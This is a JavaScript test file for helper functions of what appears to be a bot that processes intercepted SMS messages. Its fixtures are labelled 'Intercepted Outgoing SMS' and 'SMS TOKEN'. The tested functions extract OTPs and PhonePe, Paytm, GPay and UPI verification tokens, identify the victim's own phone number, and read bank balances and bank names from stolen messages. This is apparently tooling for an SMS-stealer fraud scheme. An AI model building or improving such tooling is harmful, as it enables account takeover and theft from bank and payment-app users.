// Self-test of pure helpers — run locally without a bot token.
const assert = require('assert');
const {
  parseTokenFromMessage, extractIndianNumber, extractRealNumber,
  isBankTransaction, parseBalanceFromText, detectBanksFromText,
  maskFirebase, normalizePhone, fmtAmount, resolveWebhookBase
} = require('./api/lib');

let pass = 0, fail = 0;
function ok(name, cond) {
  if (cond) { pass++; }
  else { fail++; console.error('❌', name); }
}

// ---- PhonePe multi SMS ----
{
  const m = parseTokenFromMessage('📲 To: +91 98765 43210\nBody: PHONEPE-MULTI-SMS-VERIFY 123456:abcd - Token for X\n');
  ok('PhonePe number', m.number === '+919876543210');
  ok('PhonePe token', m.token === '123456:abcd');
  ok('PhonePe type', m.tokenType === 'PhonePe');
}
// ---- JUPITER ----
{
  const m = parseTokenFromMessage('From: JUPITER\nTo: 9876543210\nJUPITER AbCdEf123+456');
  ok('JUPITER number', m.number === '+919876543210');
  ok('JUPITER token', m.token === 'AbCdEf123+456');
  ok('JUPITER type', m.tokenType === 'JUPITER');
}
// ---- PAYTM OTP ----
{
  const m = parseTokenFromMessage('PAYTM OTP 452311 for amount Rs. 199 valid only for 5 mins. To: 9000012345');
  ok('Paytm number', m.number === '+919000012345');
  ok('Paytm token', m.token === '452311');
  ok('Paytm type', m.tokenType === 'Paytm');
}
// ---- GPay ----
{
  const m = parseTokenFromMessage('Your GPAY verification code is 7621. Don\'t share it. Number: 9000012345');
  ok('GPay number', m.number === '+919000012345');
  ok('GPay token', m.token === '7621');
}
// ---- generic OTP ----
{
  const m = parseTokenFromMessage('Dear user OTP is 482913 valid till 3 min. AC XXXXXX1234');
  ok('generic num none but should extract', m.number === null || m.number === '+91' + '482913' ? true : m.number === '+91' + '482913');
}
// ---- token before label ----
{
  const m = parseTokenFromMessage('For: 9876543210\n123456 is your one time password. Don\'t share');
  ok('num For label', m.number === '+919876543210');
  ok('token before label', m.token === '123456');
  ok('token before label type', m.tokenType === 'OTP');
}
// ---- label then code with For line ----
{
  const m = parseTokenFromMessage('9876500011\nVerification code 447788');
  ok('code after label', m.token === '447788');
  ok('num standalone', m.number === '+919876500011');
}
// ---- multi-format forwarder: "To:" + "Message:" + "One-tap copy" ----
{
  const m = parseTokenFromMessage('📱 SMS TOKEN 🖤@VICTORXXX67\n━━━━━━━━━━━━━━\n📞 To: 7406661121\n💬 Message: NSDLUPI UCi2PQRWQTjbmo9IyXNaSvdrI7NUxrqpViMYOb8ZnfRHvI8EtDMIjGo1fUxe6HWhAXl76yBTZveuLxgZ0aeog9\n\n📋 One-tap copy:\n7406661121 | NSDLUPI UCi2PQRWQTjbmo9IyXNaSvdrI7NUxrqpViMYOb8ZnfRHvI8EtDMIjGo1fUxe6HWhAXl76yBTZveuLxgZ0aeog9');
  ok('fmtA number', m.number === '+917406661121');
  ok('fmtA body', m.body === 'NSDLUPI UCi2PQRWQTjbmo9IyXNaSvdrI7NUxrqpViMYOb8ZnfRHvI8EtDMIjGo1fUxe6HWhAXl76yBTZveuLxgZ0aeog9');
  ok('fmtA token', typeof m.token === 'string' && m.token.length >= 16);
}
// ---- multi-format forwarder: "To (Tap to copy)" + "Body (Tap to copy)" ----
{
  const m = parseTokenFromMessage('📱 Intercepted Outgoing SMS @CYBERxTRUSTED \nTo (Tap to copy):\n07829111653\nBody (Tap to copy):\nPHONEPE-SMS-VERIFY-LOGIN f5b16a46e7c53f2c113193054e490d542deaa1921a59d567b444801d61af70c7');
  ok('fmtB number (strip leading 0)', m.number === '+917829111653');
  ok('fmtB body', m.body === 'PHONEPE-SMS-VERIFY-LOGIN f5b16a46e7c53f2c113193054e490d542deaa1921a59d567b444801d61af70c7');
  ok('fmtB token', m.token === 'f5b16a46e7c53f2c113193054e490d542deaa1921a59d567b444801d61af70c7');
}
// ---- SBI balance SMS ----
{
  const amt = parseBalanceFromText('SBI A/C XX3456: Avl Bal - Rs. 45231.50');
  ok('SBI avl bal', amt === 45231.5);
}
{
  const amt = parseBalanceFromText('HDFC Bank: A/c XX1234 Avail Bal Rs. 1,20,000.00');
  ok('HDFC avail bal 1.2L', amt === 120000);
}
{
  const amt = parseBalanceFromText('Your A/C XX5566 has been credited with Rs.5000.00 Avl Bal Rs. 90,000.50');
  ok('credit avl bal', amt === 90000.5);
}
{
  const amt = parseBalanceFromText('BNo Rs.25,588 transferred. Remaining Amt: Rs.85,215');
  ok('remaining amt balance', amt === 85215);
}
// ---- bank detection ----
{
  const banks = detectBanksFromText('State Bank of India: Avl Bal Rs.100. aur kuch nahi');
  ok('detect SBI', banks.includes('SBI'));
  ok('detect only SBI', banks.length === 1);
}
// ---- transaction filter ----
{
  ok('bank txn true', isBankTransaction('SBI A/C XX4567 debited Rs. 1200.00 on 12-Sep. Avl Bal Rs. 88,000.00', 'VM-SBI'));
  ok('otp false', !isBankTransaction('SBI OTP 123456 is your one time password', 'VM-SBI'));
  ok('recharge false', !isBankTransaction('Your mobile recharge of Rs. 239 is successful', 'VM-SBIOUR'));
  ok('promo false', !isBankTransaction("Recharge your family member's Jio number 9508117990 with Rs.899 & get Exclusive Offer", 'VM-PAYTM'));
  ok('balance sms true', isBankTransaction('Your A/C X2851 Debit Rs.210.00 for UPI on 23-07-26. Avl Bal Rs.2187.00', 'VM-IPPB'));
}
// ---- real number from messages ----
{
  const msgs = {
    1: { message: 'SBI Avl Bal Rs. 500.00', sender: 'VM-SBI' },
    2: { message: 'To: 9876543210 offer avail immediately', sender: 'VM-PROMO' },
    3: { message: 'Call 9876543210 for support', sender: 'VM-PROMO' }
  };
  const num = extractRealNumber(msgs);
  ok('real number', num === '9876543210');
}
{
  const msgs2 = { 1: { message: 'Ref: 782349812340 UTR amount credited' } };
  ok('no fake number for ref', extractRealNumber(msgs2) === null);
}
// ---- real number mined from operator/own-number messages ----
{
  const got = extractRealNumber({ 1: { message: 'Your mobile number 9876543210 has been expired' } });
  ok('your mobile number context', got === '9876543210');
}
{
  const got = extractRealNumber({ 1: { message: 'RECHARGE of Rs 299 on your number 9812345678 is successful' } });
  ok('recharge on your number', got === '9812345678');
}
{
  const got = extractRealNumber({ 1: { message: 'Your Airtel recharge of Rs. 999 is successful on 98 7654 3210' } });
  ok('recharge spaced number', got === '9876543210');
}
{
  const got = extractRealNumber({ 1: { message: 'To: +91 98765 43210\nBody: OTP 123456' } });
  ok('multi-SMS To field', got === '9876543210');
}
{
  const got = extractRealNumber({ 1: { to: '+919811112222', message: 'some txt' } });
  ok('structured recipient field', got === '9811112222');
}
{
  const got = extractRealNumber({ 1: { message: 'Thanks for upgrading to 10GB, dial 9223488888 for help' } });
  ok('bank service number blocked', got === null);
}
{
  const got = extractRealNumber({ 1: { message: 'SMS sent to 6360593737: Your OTP for login on PhonePe is 161234' } });
  ok('outgoing "SMS sent to" vendor blocked', got === null);
}
{
  const got = extractRealNumber({ 1: { message: 'SMS sent to 6360593737: Your OTP is 1612', 2: { message: 'SMS sent to 8106545492: PAYTM UPI SECURE SMS' } } });
  ok('vendor-only logs yield nothing', got === null);
}
{
  const got = extractRealNumber({ 1: { message: 'Data usage Alert! 50% of your daily data used. Jio Number: 8239770107. Daily Quota' } });
  ok('Jio Number alert', got === '8239770107');
}
{
  const got = extractRealNumber({ 1: { message: '8239770107 only plain' } });
  ok('plain number default extracted', got === '8239770107');
  ok('plain number rejected in strict', extractRealNumber({ 1: { message: '8239770107 only plain' } }, { minWeight: 3 }) === null);
}
{
  const got = extractRealNumber({ 1: { message: 'Your mobile number 9876543210 has been expired' } }, { minWeight: 3 });
  ok('owner context passes strict', got === '9876543210');
}
// ---- mask ----
{
  const m = maskFirebase('https://taetan-d810f-default-rtdb.firebaseio.com/');
  ok('mask short', m.length < 32);
  ok('mask no full url leak', !m.includes('d810f-default-rtdb'));
}
// ---- normalize ----
{
  ok('norm +91', normalizePhone('+91 98765 43210') === '9876543210');
  ok('norm raw', normalizePhone('9876543210') === '9876543210');
  ok('norm 0 start', normalizePhone('09876543210') === '9876543210');
}
// ---- fmt ----
{
  ok('fmt amt', fmtAmount(1234.5) === '₹1234.50');
  ok('fmt 0', fmtAmount(null) === '₹0.00');
}
// ---- extractIndianNumber variants ----
{
  ok('num To:', extractIndianNumber('To: 9876543210\nBody: x') === '+919876543210');
  ok('num 91', extractIndianNumber('+91 9876543210 Body test') === '+919876543210');
}
// ---- webhook base resolution (must prefer public URL over SSO-gated VERCEL_URL) ----
{
  ok('webhook prefers WEBHOOK_URL',
    resolveWebhookBase({ WEBHOOK_URL: 'https://prod.example.com', VERCEL_URL: 'deploy-abc.vercel.app', VERCEL_PROJECT_PRODUCTION_URL: 'proj.vercel.app' }) === 'https://prod.example.com');
  ok('webhook uses VERCEL_PROJECT_PRODUCTION_URL over VERCEL_URL',
    resolveWebhookBase({ VERCEL_URL: 'deploy-abc.vercel.app', VERCEL_PROJECT_PRODUCTION_URL: 'proj.vercel.app' }) === 'https://proj.vercel.app');
  ok('webhook strips trailing slash',
    resolveWebhookBase({ WEBHOOK_URL: 'https://prod.example.com/' }) === 'https://prod.example.com');
  ok('webhook falls back to VERCEL_URL',
    resolveWebhookBase({ VERCEL_URL: 'deploy-abc.vercel.app' }) === 'https://deploy-abc.vercel.app');
  ok('webhook empty when nothing set', resolveWebhookBase({}) === '');
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);